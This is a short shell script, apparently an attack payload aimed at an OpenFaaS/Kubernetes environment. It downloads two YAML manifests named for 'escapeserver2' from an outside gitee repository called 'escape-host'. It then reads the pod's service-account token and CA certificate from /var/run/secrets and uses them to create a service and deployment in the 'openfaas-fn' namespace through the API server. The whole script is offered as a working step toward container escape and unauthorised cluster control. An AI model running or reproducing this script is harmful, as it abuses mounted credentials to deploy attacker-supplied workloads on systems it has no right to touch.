#!/bin/sh
wget https://gitee.com/jinyuchata/escape-host/raw/master/escapeserver2_service.yaml -O escapeserver2_service.yaml && wget https://gitee.com/jinyuchata/escape-host/raw/master/escapeserver2_pod.yaml -O escapeserver2_pod.yaml && export APISERVER=https://kubernetes.default.svc && export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount && export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace) && export TOKEN=$(cat ${SERVICEACCOUNT}/token) && export CACERT=${SERVICEACCOUNT}/ca.crt && curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" --header "Content-Type: application/yaml" -X POST ${APISERVER}/api/v1/namespaces/openfaas-fn/services/ -d "$(cat escapeserver2_service.yaml)" && curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" --header "Content-Type: application/yaml" -X POST ${APISERVER}/apis/apps/v1/namespaces/openfaas-fn/deployments -d "$(cat escapeserver2_pod.yaml)" 